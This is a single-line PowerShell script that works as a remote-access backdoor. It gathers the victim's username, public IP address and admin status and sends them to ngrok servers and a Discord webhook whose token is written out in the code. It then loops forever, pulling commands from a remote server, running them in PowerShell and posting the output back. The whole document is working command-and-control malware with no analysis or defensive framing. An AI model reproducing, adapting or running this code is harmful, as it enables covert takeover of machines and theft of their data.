$sendserver="https://404611374.ngrok.io";$httpserver="https://serverhttp.ngrok.io";$webhookUri='https://discord.com/api/webhooks/1215498255593639996/9XYdMB4oJjrL1gyLZM1KLJK0BuQLkMQVk7CCNA0d6hcurPmMHo-spwPpdDyoZycb0Gah';$ran=Get-Random;$lll="clients";$c=$null;$clients=whoami;$clients+=" "+(Invoke-WebRequest ifconfig.me/ip).Content.Trim();$body=$null;$notification="all data image related will be sent here";$currentPrincipal=New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent());if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)-eq$False){$check="we are not admin"}else{$check="we are admin"};try{$welcomeclient=Invoke-WebRequest -Method Post -URI $sendserver -Body $check,$ran -UseBasicParsing}catch{Write-Output "Server isnt active."};$cb=$check,$ran,$notification;foreach($item in $cb){$body+="$item`n"};$jsonBody=@{'username'=$ran;'content'=$body};$jsonBody=$jsonBody|ConvertTo-Json;Invoke-RestMethod -Uri $webhookUri -Method 'post' -ContentType 'application/json' -Body $jsonBody;while($true){$MAIN=Invoke-WebRequest -TimeoutSec 1 $httpserver|Select-Object -Expand Content;if($MAIN -match $ran){$REM=$MAIN-replace $ran,"";$EXE=Powershell /c $REM;try{$Response=Invoke-WebRequest -Method Post -URI $sendserver -Body $EXE -UseBasicParsing}catch{Write-Output "web server isnt running..."}}if($MAIN -match $lll){try{$Response=Invoke-WebRequest -Method Post -URI $sendserver -Body $sendserver -UseBasicParsing;sleep 0.8}catch{Write-Output "web server isnt running..."}}sleep 0.5}
